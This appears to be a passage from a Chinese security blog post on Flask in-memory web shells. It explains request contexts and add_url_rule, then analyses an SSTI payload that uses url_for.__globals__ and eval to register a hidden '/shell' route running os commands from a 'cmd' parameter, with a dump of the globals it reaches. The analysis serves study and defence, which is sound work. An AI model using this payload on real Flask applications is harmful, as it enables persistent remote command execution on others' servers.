        <span class="hljs-string">"""Binds the request context to the current context."""</span>
        <span class="hljs-comment"># Before we push the request context we have to ensure that there</span>
        <span class="hljs-comment"># is an application context.</span>
        app_ctx = _app_ctx_stack.top
        <span class="hljs-keyword">if</span> app_ctx <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> app_ctx.app != self.app:
            app_ctx = self.app.app_context()
            app_ctx.push()
            self._implicit_app_ctx_stack.append(app_ctx)
        <span class="hljs-keyword">else</span>:
            self._implicit_app_ctx_stack.append(<span class="hljs-literal">None</span>)

        _request_ctx_stack.push(self)

        self.session = self.app.open_session(self.request)
        <span class="hljs-keyword">if</span> self.session <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self.session = self.app.make_null_session()

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">self, exc=_sentinel</span>):
        <span class="hljs-string">"""Pops the request context and unbinds it by doing that.  This will</span>
<span class="hljs-string">        also trigger the execution of functions registered by the</span>
<span class="hljs-string">        :meth:`~flask.Flask.teardown_request` decorator.</span>
<span class="hljs-string">        """</span>
        app_ctx = self._implicit_app_ctx_stack.pop()

        <span class="hljs-keyword">try</span>:
            clear_request = <span class="hljs-literal">False</span>
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._implicit_app_ctx_stack:
                self.app.do_teardown_request(exc)

                request_close = <span class="hljs-built_in">getattr</span>(self.request, <span class="hljs-string">'close'</span>, <span class="hljs-literal">None</span>)
                <span class="hljs-keyword">if</span> request_close <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                    request_close()
                clear_request = <span class="hljs-literal">True</span>
        <span class="hljs-keyword">finally</span>:
            rv = _request_ctx_stack.pop()

            <span class="hljs-comment"># get rid of circular dependencies at the end of the request</span>
            <span class="hljs-comment"># so that we don't require the GC to be active.</span>
            <span class="hljs-keyword">if</span> clear_request:
                rv.request.environ[<span class="hljs-string">'werkzeug.request'</span>] = <span class="hljs-literal">None</span>

            <span class="hljs-comment"># Get rid of the app as well if necessary.</span>
            <span class="hljs-keyword">if</span> app_ctx <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:
                app_ctx.pop(exc)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_pop</span>(<span class="hljs-params">self, exc</span>):
        <span class="hljs-keyword">if</span> self.request.environ.get(<span class="hljs-string">'flask._preserve_context'</span>) <span class="hljs-keyword">or</span> \
           (exc <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> self.app.preserve_context_on_exception):
            self.preserved = <span class="hljs-literal">True</span>
            self._preserved_exc = exc
        <span class="hljs-keyword">else</span>:
            self.pop(exc)

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):
        self.push()
        <span class="hljs-keyword">return</span> self

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_value, tb</span>):
        self.auto_pop(exc_value)</code></pre>
<p>每个 request context 都保存了当前请求的信息，比如 request 对象和 app 对象。在初始化的最后，还调用了 <code>match_request</code> 实现了<a target="_blank" rel="noopener" href="https://cizixs.com/2017/01/12/flask-insight-routing">路由的匹配逻辑</a>。</p>
<p><code>push</code> 操作就是把该请求的 <code>ApplicationContext</code>（如果 <code>_app_ctx_stack</code> 栈顶不是当前请求所在 app ，需要创建新的 app context） 和 <code>RequestContext</code> 有关的信息保存到对应的栈上，压栈后还会保存 session 的信息； <code>pop</code> 则相反，把 request context 和 application context 出栈，做一些清理性的工作。</p>
<p>到这里，上下文的实现就比较清晰了：每次有请求过来的时候，flask 会先创建当前线程或者进程需要处理的两个重要上下文对象，把它们保存到隔离的栈里面，这样视图函数进行处理的时候就能直接从栈上获取这些信息。</p>
<h2 id="add_url_rule">add_url_rule</h2>
<p>了解到，每次注册路由的时候，都会调用Route函数，跟进看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="D:%5Cblog%5CHexo%5Csource_posts%5Cflask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%5Cimage-20240528133149806.png" alt="image-20240528133149806"></p>
<p>这里还有一个add_url_rule函数，看其中的参数，了解一下：</p>
<blockquote>
<p>rule：函数对应的<code>URL</code>规则, 满足条件和<code>app.route</code>的第一个参数一样, 必须以<code>/</code>开头。<br>
endpoint：代表该路由绑定的函数名：端点, 即在使用<code>url_for</code>进行反转的时候, 这里传入的第一个参数就是<code>endpoint</code>对应的值, 这个值也可以不指定, 默认就会使用函数的名字作为<code>endpoint</code>的值.<br>
view_func：就是对应的这个路由的函数，每次请求这个路由都交由这个函数处理。<code>URL</code>对应的函数, 这里只需写函数名字而不用加括号.<br>
provide…：这里就是请求方法的意思，默认是GET，控制是否应自动添加选项方法.<br>
options: 要转发到基础规则对象的选项.</p>
</blockquote>
<p>同时函数这里可以用lambda表达式写</p>
<h1 id="0x04-poc分析">0x04 POC分析</h1>
<p>这里直接分析一个常见的payload</p>
<pre><code class="hljs scss">url_for<span class="hljs-selector-class">.__globals__</span><span class="hljs-selector-attr">[<span class="hljs-string">'__builtins__'</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">'eval'</span>]</span>(
    "app.add_url_rule(
        '/shell', 
        'shell', 
        lambda :__import__('os')<span class="hljs-selector-class">.popen</span>(_request_ctx_stack.top.request.args.get('cmd', 'whoami'))<span class="hljs-selector-class">.read</span>()
    )",
    {
        '_request_ctx_stack':url_for.__globals__[<span class="hljs-string">'_request_ctx_stack'</span>],
        <span class="hljs-string">'app'</span>:url_for.__globals__[<span class="hljs-string">'current_app'</span>]
    }
)</code></pre>
<p>对于<code>url_for.__globals__['__builtins__']['eval']</code>这一截，url_for是一个flask的内置函数，这样可以调用他的<code>__global__</code>属性，该属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，我们键入<code>url_for.__globals__</code>查看当前所有变量</p>
<pre><code class="hljs scss">{'__name__': <span class="hljs-string">'flask.app'</span>, <span class="hljs-string">'__doc__'</span>: None, <span class="hljs-string">'__package__'</span>: <span class="hljs-string">'flask'</span>, <span class="hljs-string">'__loader__'</span>: &lt;_frozen_importlib_external.SourceFileLoader object at <span class="hljs-number">0</span>x000002AF7EFF1610&gt;, <span class="hljs-string">'__spec__'</span>: <span class="hljs-built_in">ModuleSpec</span>(name=<span class="hljs-string">'flask.app'</span>, loader=&lt;_frozen_importlib_external.SourceFileLoader object at <span class="hljs-number">0</span>x000002AF7EFF1610&gt;, origin=<span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\site-packages\\flask\\app.py'</span>), <span class="hljs-string">'__file__'</span>: <span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\site-packages\\flask\\app.py'</span>, <span class="hljs-string">'__cached__'</span>: <span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\site-packages\\flask\\__pycache__\\app.cpython-38.pyc'</span>, <span class="hljs-string">'__builtins__'</span>: {'__name__': <span class="hljs-string">'builtins'</span>, <span class="hljs-string">'__doc__'</span>: <span class="hljs-string">"Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."</span>, <span class="hljs-string">'__package__'</span>: <span class="hljs-string">''</span>, <span class="hljs-string">'__loader__'</span>: &lt;class <span class="hljs-string">'_frozen_importlib.BuiltinImporter'</span>&gt;, <span class="hljs-string">'__spec__'</span>: <span class="hljs-built_in">ModuleSpec</span>(name=<span class="hljs-string">'builtins'</span>, loader=&lt;class <span class="hljs-string">'_frozen_importlib.BuiltinImporter'</span>&gt;), <span class="hljs-string">'__build_class__'</span>: &lt;built-in function __build_class__&gt;, <span class="hljs-string">'__import__'</span>: &lt;built-in function __import__&gt;, <span class="hljs-string">'abs'</span>: &lt;built-in function abs&gt;, <span class="hljs-string">'all'</span>: &lt;built-in function all&gt;, <span class="hljs-string">'any'</span>: &lt;built-in function any&gt;, <span class="hljs-string">'ascii'</span>: &lt;built-in function ascii&gt;, <span class="hljs-string">'bin'</span>: &lt;built-in function bin&gt;, <span class="hljs-string">'breakpoint'</span>: &lt;built-in function breakpoint&gt;, <span class="hljs-string">'callable'</span>: &lt;built-in function callable&gt;, <span class="hljs-string">'chr'</span>: &lt;built-in function chr&gt;, <span class="hljs-string">'compile'</span>: &lt;built-in function compile&gt;, <span class="hljs-string">'delattr'</span>: &lt;built-in function delattr&gt;, <span class="hljs-string">'dir'</span>: &lt;built-in function dir&gt;, <span class="hljs-string">'divmod'</span>: &lt;built-in function divmod&gt;, <span class="hljs-string">'eval'</span>: &lt;built-in function eval&gt;, <span class="hljs-string">'exec'</span>: &lt;built-in function exec&gt;, <span class="hljs-string">'format'</span>: &lt;built-in function format&gt;, <span class="hljs-string">'getattr'</span>: &lt;built-in function getattr&gt;, <span class="hljs-string">'globals'</span>: &lt;built-in function globals&gt;, <span class="hljs-string">'hasattr'</span>: &lt;built-in function hasattr&gt;, <span class="hljs-string">'hash'</span>: &lt;built-in function hash&gt;, <span class="hljs-string">'hex'</span>: &lt;built-in function hex&gt;, <span class="hljs-string">'id'</span>: &lt;built-in function id&gt;, <span class="hljs-string">'input'</span>: &lt;built-in function input&gt;, <span class="hljs-string">'isinstance'</span>: &lt;built-in function isinstance&gt;, <span class="hljs-string">'issubclass'</span>: &lt;built-in function issubclass&gt;, <span class="hljs-string">'iter'</span>: &lt;built-in function iter&gt;, <span class="hljs-string">'len'</span>: &lt;built-in function len&gt;, <span class="hljs-string">'locals'</span>: &lt;built-in function locals&gt;, <span class="hljs-string">'max'</span>: &lt;built-in function max&gt;, <span class="hljs-string">'min'</span>: &lt;built-in function min&gt;, <span class="hljs-string">'next'</span>: &lt;built-in function next&gt;, <span class="hljs-string">'oct'</span>: &lt;built-in function oct&gt;, <span class="hljs-string">'ord'</span>: &lt;built-in function ord&gt;, <span class="hljs-string">'pow'</span>: &lt;built-in function pow&gt;, <span class="hljs-string">'print'</span>: &lt;built-in function print&gt;, <span class="hljs-string">'repr'</span>: &lt;built-in function repr&gt;, <span class="hljs-string">'round'</span>: &lt;built-in function round&gt;, <span class="hljs-string">'setattr'</span>: &lt;built-in function setattr&gt;, <span class="hljs-string">'sorted'</span>: &lt;built-in function sorted&gt;, <span class="hljs-string">'sum'</span>: &lt;built-in function sum&gt;, <span class="hljs-string">'vars'</span>: &lt;built-in function vars&gt;, <span class="hljs-string">'None'</span>: None, <span class="hljs-string">'Ellipsis'</span>: Ellipsis, <span class="hljs-string">'NotImplemented'</span>: NotImplemented, <span class="hljs-string">'False'</span>: False, <span class="hljs-string">'True'</span>: True, <span class="hljs-string">'bool'</span>: &lt;class <span class="hljs-string">'bool'</span>&gt;, <span class="hljs-string">'memoryview'</span>: &lt;class <span class="hljs-string">'memoryview'</span>&gt;, <span class="hljs-string">'bytearray'</span>: &lt;class <span class="hljs-string">'bytearray'</span>&gt;, <span class="hljs-string">'bytes'</span>: &lt;class <span class="hljs-string">'bytes'</span>&gt;, <span class="hljs-string">'classmethod'</span>: &lt;class <span class="hljs-string">'classmethod'</span>&gt;, <span class="hljs-string">'complex'</span>: &lt;class <span class="hljs-string">'complex'</span>&gt;, <span class="hljs-string">'dict'</span>: &lt;class <span class="hljs-string">'dict'</span>&gt;, <span class="hljs-string">'enumerate'</span>: &lt;class <span class="hljs-string">'enumerate'</span>&gt;, <span class="hljs-string">'filter'</span>: &lt;class <span class="hljs-string">'filter'</span>&gt;, <span class="hljs-string">'float'</span>: &lt;class <span class="hljs-string">'float'</span>&gt;, <span class="hljs-string">'frozenset'</span>: &lt;class <span class="hljs-string">'frozenset'</span>&gt;, <span class="hljs-string">'property'</span>: &lt;class <span class="hljs-string">'property'</span>&gt;, <span class="hljs-string">'int'</span>: &lt;class <span class="hljs-string">'int'</span>&gt;, <span class="hljs-string">'list'</span>: &lt;class <span class="hljs-string">'list'</span>&gt;, <span class="hljs-string">'map'</span>: &lt;class <span class="hljs-string">'map'</span>&gt;, <span class="hljs-string">'object'</span>: &lt;class <span class="hljs-string">'object'</span>&gt;, <span class="hljs-string">'range'</span>: &lt;class <span class="hljs-string">'range'</span>&gt;, <span class="hljs-string">'reversed'</span>: &lt;class <span class="hljs-string">'reversed'</span>&gt;, <span class="hljs-string">'set'</span>: &lt;class <span class="hljs-string">'set'</span>&gt;, <span class="hljs-string">'slice'</span>: &lt;class <span class="hljs-string">'slice'</span>&gt;, <span class="hljs-string">'staticmethod'</span>: &lt;class <span class="hljs-string">'staticmethod'</span>&gt;, <span class="hljs-string">'str'</span>: &lt;class <span class="hljs-string">'str'</span>&gt;, <span class="hljs-string">'super'</span>: &lt;class <span class="hljs-string">'super'</span>&gt;, <span class="hljs-string">'tuple'</span>: &lt;class <span class="hljs-string">'tuple'</span>&gt;, <span class="hljs-string">'type'</span>: &lt;class <span class="hljs-string">'type'</span>&gt;, <span class="hljs-string">'zip'</span>: &lt;class <span class="hljs-string">'zip'</span>&gt;, <span class="hljs-string">'__debug__'</span>: True, <span class="hljs-string">'BaseException'</span>: &lt;class <span class="hljs-string">'BaseException'</span>&gt;, <span class="hljs-string">'Exception'</span>: &lt;class <span class="hljs-string">'Exception'</span>&gt;, <span class="hljs-string">'TypeError'</span>: &lt;class <span class="hljs-string">'TypeError'</span>&gt;, <span class="hljs-string">'StopAsyncIteration'</span>: &lt;class <span class="hljs-string">'StopAsyncIteration'</span>&gt;, <span class="hljs-string">'StopIteration'</span>: &lt;class <span class="hljs-string">'StopIteration'</span>&gt;, <span class="hljs-string">'GeneratorExit'</span>: &lt;class <span class="hljs-string">'GeneratorExit'</span>&gt;, <span class="hljs-string">'SystemExit'</span>: &lt;class <span class="hljs-string">'SystemExit'</span>&gt;, <span class="hljs-string">'KeyboardInterrupt'</span>: &lt;class <span class="hljs-string">'KeyboardInterrupt'</span>&gt;, <span class="hljs-string">'ImportError'</span>: &lt;class <span class="hljs-string">'ImportError'</span>&gt;, <span class="hljs-string">'ModuleNotFoundError'</span>: &lt;class <span class="hljs-string">'ModuleNotFoundError'</span>&gt;, <span class="hljs-string">'OSError'</span>: &lt;class <span class="hljs-string">'OSError'</span>&gt;, <span class="hljs-string">'EnvironmentError'</span>: &lt;class <span class="hljs-string">'OSError'</span>&gt;, <span class="hljs-string">'IOError'</span>: &lt;class <span class="hljs-string">'OSError'</span>&gt;, <span class="hljs-string">'WindowsError'</span>: &lt;class <span class="hljs-string">'OSError'</span>&gt;, <span class="hljs-string">'EOFError'</span>: &lt;class <span class="hljs-string">'EOFError'</span>&gt;, <span class="hljs-string">'RuntimeError'</span>: &lt;class <span class="hljs-string">'RuntimeError'</span>&gt;, <span class="hljs-string">'RecursionError'</span>: &lt;class <span class="hljs-string">'RecursionError'</span>&gt;, <span class="hljs-string">'NotImplementedError'</span>: &lt;class <span class="hljs-string">'NotImplementedError'</span>&gt;, <span class="hljs-string">'NameError'</span>: &lt;class <span class="hljs-string">'NameError'</span>&gt;, <span class="hljs-string">'UnboundLocalError'</span>: &lt;class <span class="hljs-string">'UnboundLocalError'</span>&gt;, <span class="hljs-string">'AttributeError'</span>: &lt;class <span class="hljs-string">'AttributeError'</span>&gt;, <span class="hljs-string">'SyntaxError'</span>: &lt;class <span class="hljs-string">'SyntaxError'</span>&gt;, <span class="hljs-string">'IndentationError'</span>: &lt;class <span class="hljs-string">'IndentationError'</span>&gt;, <span class="hljs-string">'TabError'</span>: &lt;class <span class="hljs-string">'TabError'</span>&gt;, <span class="hljs-string">'LookupError'</span>: &lt;class <span class="hljs-string">'LookupError'</span>&gt;, <span class="hljs-string">'IndexError'</span>: &lt;class <span class="hljs-string">'IndexError'</span>&gt;, <span class="hljs-string">'KeyError'</span>: &lt;class <span class="hljs-string">'KeyError'</span>&gt;, <span class="hljs-string">'ValueError'</span>: &lt;class <span class="hljs-string">'ValueError'</span>&gt;, <span class="hljs-string">'UnicodeError'</span>: &lt;class <span class="hljs-string">'UnicodeError'</span>&gt;, <span class="hljs-string">'UnicodeEncodeError'</span>: &lt;class <span class="hljs-string">'UnicodeEncodeError'</span>&gt;, <span class="hljs-string">'UnicodeDecodeError'</span>: &lt;class <span class="hljs-string">'UnicodeDecodeError'</span>&gt;, <span class="hljs-string">'UnicodeTranslateError'</span>: &lt;class <span class="hljs-string">'UnicodeTranslateError'</span>&gt;, <span class="hljs-string">'AssertionError'</span>: &lt;class <span class="hljs-string">'AssertionError'</span>&gt;, <span class="hljs-string">'ArithmeticError'</span>: &lt;class <span class="hljs-string">'ArithmeticError'</span>&gt;, <span class="hljs-string">'FloatingPointError'</span>: &lt;class <span class="hljs-string">'FloatingPointError'</span>&gt;, <span class="hljs-string">'OverflowError'</span>: &lt;class <span class="hljs-string">'OverflowError'</span>&gt;, <span class="hljs-string">'ZeroDivisionError'</span>: &lt;class <span class="hljs-string">'ZeroDivisionError'</span>&gt;, <span class="hljs-string">'SystemError'</span>: &lt;class <span class="hljs-string">'SystemError'</span>&gt;, <span class="hljs-string">'ReferenceError'</span>: &lt;class <span class="hljs-string">'ReferenceError'</span>&gt;, <span class="hljs-string">'MemoryError'</span>: &lt;class <span class="hljs-string">'MemoryError'</span>&gt;, <span class="hljs-string">'BufferError'</span>: &lt;class <span class="hljs-string">'BufferError'</span>&gt;, <span class="hljs-string">'Warning'</span>: &lt;class <span class="hljs-string">'Warning'</span>&gt;, <span class="hljs-string">'UserWarning'</span>: &lt;class <span class="hljs-string">'UserWarning'</span>&gt;, <span class="hljs-string">'DeprecationWarning'</span>: &lt;class <span class="hljs-string">'DeprecationWarning'</span>&gt;, <span class="hljs-string">'PendingDeprecationWarning'</span>: &lt;class <span class="hljs-string">'PendingDeprecationWarning'</span>&gt;, <span class="hljs-string">'SyntaxWarning'</span>: &lt;class <span class="hljs-string">'SyntaxWarning'</span>&gt;, <span class="hljs-string">'RuntimeWarning'</span>: &lt;class <span class="hljs-string">'RuntimeWarning'</span>&gt;, <span class="hljs-string">'FutureWarning'</span>: &lt;class <span class="hljs-string">'FutureWarning'</span>&gt;, <span class="hljs-string">'ImportWarning'</span>: &lt;class <span class="hljs-string">'ImportWarning'</span>&gt;, <span class="hljs-string">'UnicodeWarning'</span>: &lt;class <span class="hljs-string">'UnicodeWarning'</span>&gt;, <span class="hljs-string">'BytesWarning'</span>: &lt;class <span class="hljs-string">'BytesWarning'</span>&gt;, <span class="hljs-string">'ResourceWarning'</span>: &lt;class <span class="hljs-string">'ResourceWarning'</span>&gt;, <span class="hljs-string">'ConnectionError'</span>: &lt;class <span class="hljs-string">'ConnectionError'</span>&gt;, <span class="hljs-string">'BlockingIOError'</span>: &lt;class <span class="hljs-string">'BlockingIOError'</span>&gt;, <span class="hljs-string">'BrokenPipeError'</span>: &lt;class <span class="hljs-string">'BrokenPipeError'</span>&gt;, <span class="hljs-string">'ChildProcessError'</span>: &lt;class <span class="hljs-string">'ChildProcessError'</span>&gt;, <span class="hljs-string">'ConnectionAbortedError'</span>: &lt;class <span class="hljs-string">'ConnectionAbortedError'</span>&gt;, <span class="hljs-string">'ConnectionRefusedError'</span>: &lt;class <span class="hljs-string">'ConnectionRefusedError'</span>&gt;, <span class="hljs-string">'ConnectionResetError'</span>: &lt;class <span class="hljs-string">'ConnectionResetError'</span>&gt;, <span class="hljs-string">'FileExistsError'</span>: &lt;class <span class="hljs-string">'FileExistsError'</span>&gt;, <span class="hljs-string">'FileNotFoundError'</span>: &lt;class <span class="hljs-string">'FileNotFoundError'</span>&gt;, <span class="hljs-string">'IsADirectoryError'</span>: &lt;class <span class="hljs-string">'IsADirectoryError'</span>&gt;, <span class="hljs-string">'NotADirectoryError'</span>: &lt;class <span class="hljs-string">'NotADirectoryError'</span>&gt;, <span class="hljs-string">'InterruptedError'</span>: &lt;class <span class="hljs-string">'InterruptedError'</span>&gt;, <span class="hljs-string">'PermissionError'</span>: &lt;class <span class="hljs-string">'PermissionError'</span>&gt;, <span class="hljs-string">'ProcessLookupError'</span>: &lt;class <span class="hljs-string">'ProcessLookupError'</span>&gt;, <span class="hljs-string">'TimeoutError'</span>: &lt;class <span class="hljs-string">'TimeoutError'</span>&gt;, <span class="hljs-string">'open'</span>: &lt;built-in function open&gt;, <span class="hljs-string">'quit'</span>: Use <span class="hljs-built_in">quit</span>() or Ctrl-Z plus Return to exit, <span class="hljs-string">'exit'</span>: Use <span class="hljs-built_in">exit</span>() or Ctrl-Z plus Return to exit, <span class="hljs-string">'copyright'</span>: Copyright (c) <span class="hljs-number">2001</span>-<span class="hljs-number">2020</span> Python Software Foundation. All Rights Reserved. Copyright (c) <span class="hljs-number">2000</span> BeOpen.com. All Rights Reserved. Copyright (c) <span class="hljs-number">1995</span>-<span class="hljs-number">2001</span> Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) <span class="hljs-number">1991</span>-<span class="hljs-number">1995</span> Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., <span class="hljs-string">'credits'</span>: Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., <span class="hljs-string">'license'</span>: Type <span class="hljs-built_in">license</span>() to see the full license text, <span class="hljs-string">'help'</span>: Type <span class="hljs-built_in">help</span>() for interactive help, or <span class="hljs-built_in">help</span>(object) for help about object.}, 'annotations': <span class="hljs-built_in">_Feature</span>((<span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'beta'</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-string">'alpha'</span>, <span class="hljs-number">0</span>), <span class="hljs-number">16777216</span>), <span class="hljs-string">'os'</span>: &lt;module <span class="hljs-string">'os'</span> from <span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\os.py'</span>&gt;, <span class="hljs-string">'sys'</span>: &lt;module <span class="hljs-string">'sys'</span> (built-in)&gt;, <span class="hljs-string">'t'</span>: &lt;module <span class="hljs-string">'typing'</span> from <span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\typing.py'</span>&gt;, <span class="hljs-string">'weakref'</span>: &lt;module <span class="hljs-string">'weakref'</span> from <span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\weakref.py'</span>&gt;, <span class="hljs-string">'_abc_Iterator'</span>: &lt;class <span class="hljs-string">'collections.abc.Iterator'</span>&gt;, <span class="hljs-string">'timedelta'</span>: &lt;class <span class="hljs-string">'datetime.timedelta'</span>&gt;, <span class="hljs-string">'iscoroutinefunction'</span>: &lt;function iscoroutinefunction at <span class="hljs-number">0</span>x000002AF6C7E7F70&gt;, <span class="hljs-string">'chain'</span>: &lt;class <span class="hljs-string">'itertools.chain'</span>&gt;, <span class="hljs-string">'TracebackType'</span>: &lt;class <span class="hljs-string">'traceback'</span>&gt;, <span class="hljs-string">'_url_quote'</span>: &lt;function quote at <span class="hljs-number">0</span>x000002AF6C8C08B0&gt;, <span class="hljs-string">'click'</span>: &lt;module <span class="hljs-string">'click'</span> from <span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\site-packages\\click\\__init__.py'</span>&gt;, <span class="hljs-string">'Headers'</span>: &lt;class <span class="hljs-string">'werkzeug.datastructures.headers.Headers'</span>&gt;, <span class="hljs-string">'ImmutableDict'</span>: &lt;class <span class="hljs-string">'werkzeug.datastructures.structures.ImmutableDict'</span>&gt;, <span class="hljs-string">'BadRequestKeyError'</span>: &lt;class <span class="hljs-string">'werkzeug.exceptions.BadRequestKeyError'</span>&gt;, <span class="hljs-string">'HTTPException'</span>: &lt;class <span class="hljs-string">'werkzeug.exceptions.HTTPException'</span>&gt;, <span class="hljs-string">'InternalServerError'</span>: &lt;class <span class="hljs-string">'werkzeug.exceptions.InternalServerError'</span>&gt;, <span class="hljs-string">'BuildError'</span>: &lt;class <span class="hljs-string">'werkzeug.routing.exceptions.BuildError'</span>&gt;, <span class="hljs-string">'MapAdapter'</span>: &lt;class <span class="hljs-string">'werkzeug.routing.map.MapAdapter'</span>&gt;, <span class="hljs-string">'RequestRedirect'</span>: &lt;class <span class="hljs-string">'werkzeug.routing.exceptions.RequestRedirect'</span>&gt;, <span class="hljs-string">'RoutingException'</span>: &lt;class <span class="hljs-string">'werkzeug.routing.exceptions.RoutingException'</span>&gt;, <span class="hljs-string">'Rule'</span>: &lt;class <span class="hljs-string">'werkzeug.routing.rules.Rule'</span>&gt;, <span class="hljs-string">'is_running_from_reloader'</span>: &lt;function is_running_from_reloader at <span class="hljs-number">0</span>x000002AF7FA8C430&gt;, <span class="hljs-string">'BaseResponse'</span>: &lt;class <span class="hljs-string">'werkzeug.wrappers.response.Response'</span>&gt;, <span class="hljs-string">'cli'</span>: &lt;module <span class="hljs-string">'flask.cli'</span> from <span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\site-packages\\flask\\cli.py'</span>&gt;, <span class="hljs-string">'ft'</span>: &lt;module <span class="hljs-string">'flask.typing'</span> from <span class="hljs-string">'F:\\Develop\\Python-3.8.6\\lib\\site-packages\\flask\\typing.py'</span>&gt;, <span class="hljs-string">'AppContext'</span>: &lt;class <span class="hljs-string">'flask.ctx.AppContext'</span>&gt;, <span class="hljs-string">'RequestContext'</span>: &lt;class <span class="hljs-string">'flask.ctx.RequestContext'</span>&gt;, <span class="hljs-string">'_cv_app'</span>: &lt;ContextVar name=<span class="hljs-string">'flask.app_ctx'</span> at <span class="hljs-number">0</span>x000002AF7EFAD2C0&gt;, <span class="hljs-string">'_cv_request'</span>: &lt;ContextVar name=<span class="hljs-string">'flask.request_ctx'</span> at <span class="hljs-number">0</span>x000002AF7EFAD310&gt;, <span class="hljs-string">'current_app'</span>: &lt;Flask <span class="hljs-string">'Flask_debug'</span>&gt;, <span class="hljs-string">'g'</span>: &lt;flask.g of <span class="hljs-string">'Flask_debug'</span>&gt;, <span class="hljs-string">'request'</span>: &lt;Request <span class="hljs-string">'http://127.0.0.1:5555/test?name={{url_for.__globals__}}'</span> [GET]&gt;, <span class="hljs-string">'request_ctx'</span>: &lt;RequestContext <span class="hljs-string">'http://127.0.0.1:5555/test?name={{url_for.__globals__}}'</span> [GET] of Flask_debug&gt;, <span class="hljs-string">'session'</span>: &lt;NullSession {}&gt;, 'get_debug_flag': &lt;function get_debug_flag at <span class="hljs-number">0</span>x000002AF7FCD7B80&gt;, <span class="hljs-string">'get_flashed_messages'</span>: &lt;function get_flashed_messages at <span class="hljs-number">0</span>x000002AF7FCF2310&gt;, <span class="hljs-string">'get_load_dotenv'</span>: &lt;function get_load_dotenv at <span class="hljs-number">0</span>x000002AF7FCD7DC0&gt;, <span class="hljs-string">'send_from_directory'</span>: &lt;function send_from_directory at <span class="hljs-number">0</span>x000002AF7FCF24C0&gt;, <span class="hljs-string">'App'</span>: &lt;class <span class="hljs-string">'flask.sansio.app.App'</span>&gt;, <span class="hljs-string">'_sentinel'</span>: &lt;object object at <span class="hljs-number">0</span>x000002AF7FB784D0&gt;, <span class="hljs-string">'SecureCookieSessionInterface'</span>: &lt;class <span class="hljs-string">'flask.sessions.SecureCookieSessionInterface'</span>&gt;, <span class="hljs-string">'SessionInterface'</span>: &lt;class <span class="hljs-string">'flask.sessions.SessionInterface'</span>&gt;, <span class="hljs-string">'appcontext_tearing_down'</span>: &lt;blinker.base.NamedSignal object at <span class="hljs-number">0</span>x000002AF7FCD8A90; 'appcontext-tearing-down'&gt;, 'got_request_exception': &lt;blinker.base.NamedSignal object at <span class="hljs-number">0</span>x000002AF7FCD8A60; 'got-request-exception'&gt;, 'request_finished': &lt;blinker.base.NamedSignal object at <span class="hljs-number">0</span>x000002AF7FCD8820; 'request-finished'&gt;, 'request_started': &lt;blinker.base.NamedSignal object at <span class="hljs-number">0</span>x000002AF7FCD8700; 'request-started'&gt;, 'request_tearing_down': &lt;blinker.base.NamedSignal object at <span class="hljs-number">0</span>x000002AF7FCD87F0; 'request-tearing-down'&gt;, 'Environment': &lt;class <span class="hljs-string">'flask.templating.Environment'</span>&gt;, <span class="hljs-string">'Request'</span>: &lt;class <span class="hljs-string">'flask.wrappers.Request'</span>&gt;, <span class="hljs-string">'Response'</span>: &lt;class <span class="hljs-string">'flask.wrappers.Response'</span>&gt;, <span class="hljs-string">'T_shell_context_processor'</span>: ~T_shell_context_processor, <span class="hljs-string">'T_teardown'</span>: ~T_teardown, <span class="hljs-string">'T_template_filter'</span>: ~T_template_filter, <span class="hljs-string">'T_template_global'</span>: ~T_template_global, <span class="hljs-string">'T_template_test'</span>: ~T_template_test, <span class="hljs-string">'_make_timedelta'</span>: &lt;function _make_timedelta at <span class="hljs-number">0</span>x000002AF7FB51040&gt;, <span class="hljs-string">'Flask'</span>: &lt;class <span class="hljs-string">'flask.app.Flask'</span>&gt;}.</code></pre>
<p>可以看到存在eval、exec模块，接着可以看一下在<code>__builtins__</code>模块中, <code>Python</code>在启动时就直接为我们导入了很多内建函数. 准确的说, <code>Python</code>在启动时会首先加载内建名称空间, 内建名称空间中有许多名字到对象之间的映射, 这些名字就是内建函数的名称, 对象就是这些内建函数对象. 可以看到, 在<code>__builtins__</code>模块的内建函数中是存在<code>eval</code>、<code>exec</code>等命令执行函数的.</p>
